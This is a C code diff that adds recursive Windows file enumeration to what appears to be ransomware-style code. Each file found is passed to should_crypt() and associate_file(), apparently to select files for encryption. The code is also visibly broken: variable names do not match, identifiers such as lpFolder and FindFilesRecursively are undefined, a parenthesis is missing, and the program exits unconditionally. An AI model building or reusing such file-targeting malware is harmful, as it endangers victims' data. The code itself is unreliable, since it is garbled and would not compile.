@@ -15,15 +15,39 @@ return 0;
 }
 return 1;
 }
-void recurse()
+void recurse(char *folder)
 {
 char fullpath[256];
       memset(fullpath,0,sizeof(fullpath));
-WIN32_FIND_DATA;
-HANDLE findfile;
+int i = strlen(folder);
+      memcpy(fullpath,folder,i);
+WIN32_FIND_DATA data;
+HANDLE find_file;
 HANDLE thread;
+      findfile = FindFirstFileA(fullpath,&data);
+      if(findfile != INVALID_HANDLE_VALUE)
+      {
+        do{
+             if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+              {
+                // found a subdirectory; recurse into it
+                PathCombine(fullpath, lpFolder, data.cFileName);
+                FindFilesRecursively(szFullPattern, lpFilePattern);
+              }
+              else
+             {
+                   if(should_crypt(data.cFileName)
+                   {
+                         
+                      associate_file(data.cFileName);
+                         
+                   }
+             }
+          } while(FindNextFile(find_file, &data));
+        FindClose(find_file);
+      }
       
-
+exit(0);
 
 }
 void associate_file(char *filename)
